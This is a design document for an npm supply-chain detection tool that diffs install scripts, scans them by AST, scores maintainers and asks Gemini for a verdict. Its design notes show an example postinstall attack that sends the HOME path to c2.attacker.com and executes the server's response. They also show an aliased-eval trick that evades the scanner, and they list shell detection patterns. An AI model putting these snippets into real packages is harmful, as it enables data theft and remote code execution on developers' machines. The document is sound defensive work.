# Preflight — Detection Engine

## The 4-Signal Pipeline

Every package upgrade is analyzed through four sequential signal layers:

```
1. Script Diff Analysis
   → Fetch tarballs for old + new version from npm registry
   → Extract pre/postinstall/install scripts from package.json inside tarball
   → Diff scripts between versions
   → Flag: new hooks added (HIGH), existing hooks modified (MEDIUM)

2. AST Behavioral Scan
   → Shell scanner FIRST (regex): curl, wget, bash -c, base64 -d, eval $(...)
   → If hook is node <file>, extract that file from tarball and parse with acorn via subprocess
   → If hook is inline JS expression, parse directly
   → Flag combinations (not standalone): eval(var) + any, spawn(var) + net, https + spawn
   → NEVER flag standalone require('https') — too many false positives

3. Maintainer Signal Scoring (npm Registry API)
   → Account age, last publish date, provenance attestation delta
   → npm uses Sigstore provenance (dist.signatures + _attestations fields)
   → Flag: provenance ABSENT on new version when present on old (CRITICAL)
   → Flag: 90+ days inactive then sudden push (HIGH)
   → Flag: new maintainer added (HIGH)

4. Gemini AI Reasoning (gemini-2.5-flash primary, gemini-2.5-pro for BLOCK confirmation)
   → Synthesize all 3 signal outputs with structured JSON prompt
   → Output: PASS / WARN / BLOCK + confidence + summary (2 sentences max) + attack_pattern
   → Always Flash first; if Flash returns BLOCK ≥0.85, run parallel Pro confirmation
   → Posted as GitHub PR comment + sets commit status check
```

---

## Gemini Prompt Template

**First-class artifact — do not change without updating here.**

```
You are a senior supply chain security researcher. Analyze the following npm package upgrade signals and output a verdict.

Signals: {signals_json}

Output ONLY valid JSON with this exact schema, no preamble:
{
  "verdict": "PASS" | "WARN" | "BLOCK",
  "confidence": 0.0-1.0,
  "summary": "max 2 sentences explaining the verdict",
  "attack_pattern": "snake_case identifier or null"
}

Rules:
- BLOCK: confidence >= 0.85 AND 2+ signals flagged
- WARN: confidence >= 0.60 AND 1+ signal flagged
- PASS: otherwise
- Do not explain your reasoning outside the JSON object.

Examples:
[BLOCK example]: signals show new postinstall with outbound HTTPS + key change → {"verdict":"BLOCK","confidence":0.94,"summary":"New postinstall hook opens outbound connection combined with provenance attestation removal after 8 months inactivity. Pattern matches known supply chain hijack.","attack_pattern":"npm_account_hijack_rat_deployment"}
[WARN example]: signals show only minor hook change, no network call → {"verdict":"WARN","confidence":0.65,"summary":"Postinstall hook modified but no network activity detected. Recommend manual review before merging.","attack_pattern":null}
[PASS example]: no signals flagged → {"verdict":"PASS","confidence":0.97,"summary":"No suspicious behavior detected in this upgrade.","attack_pattern":null}
```

---

## Gemini Fail-Safe (when Gemini unreachable)

```python
flagged_count = sum([script_diff.flagged, ast_scan.flagged, maintainer.flagged])
if flagged_count >= 3:   verdict, confidence = "BLOCK", 0.90
elif flagged_count == 2: verdict, confidence = "WARN",  0.65
elif flagged_count == 1: verdict, confidence = "WARN",  0.40
else:                    verdict, confidence = "PASS",  0.95
```

---

## Maintainer Risk Score Formula

```
score = 0
+ provenance removed when previously present: +50
+ inactive_days > 180:                        +35
+ inactive_days 90-180:                       +25
+ new_maintainer_added:                       +20
  (weight -10 if downloads > 1M AND package_age > 365 days)
+ package_age < 30 days AND weekly_downloads > 10000: +15
cap at 100
```

---

## Confidence Thresholds

- `BLOCK` only if confidence ≥ 0.85
- `WARN` for 0.60–0.84
- `PASS` below 0.60

---

## Hard Override Rules (bypass Gemini verdict)

```
3+ signals flagged                → always BLOCK, confidence 0.90
provenance removed + new net call → always BLOCK, confidence 0.95
Gemini unreachable                → rule-based fallback (see above)
API unreachable from action       → WARN, fail open (never silent block)
```

---

## AST Scan — Design Notes

**It is not a knowledge graph.** What it actually does:

1. acorn parses the JS string → AST in ~5ms for a typical postinstall script
2. Single O(n) traversal over AST nodes
3. Looks for specific `CallExpression` types: `eval`, `spawn`, `exec`, `https.get`
4. Flags **combinations** only — not standalone calls (avoids false positives on `require('https')`)

**Why shell regex alone is not enough:**

Real JS supply chain attacks use patterns like:
```js
const https = require('https');
const cp = require('child_process');
https.get(`https://c2.attacker.com/?d=${process.env.HOME}`, (r) => {
  r.on('data', (d) => cp.exec(d.toString()));
});
```
No shell commands. Shell regex returns clean. AST scanner catches `https + spawn` combination.

**Known limitation — aliased eval evades it:**
```js
const f = eval;
f(Buffer.from('bWFsd...', 'base64').toString());
```
Real supply chain attackers rarely obfuscate postinstall hooks — heavy obfuscation is itself a signal Gemini catches independently.

**Performance:** acorn subprocess cold start ~200ms, parsing <10ms. Negligible within the 45s budget.

---

## Script Diff — Design Notes

**`prepare` hook deliberately NOT in `HOOK_KEYS`**: `prepare` does not run when installing a package from the npm registry as a dependency (npm v7+). It only runs when developing the package locally or installing from a git URL. Adding it would generate false positives on React, Babel, and most major packages.
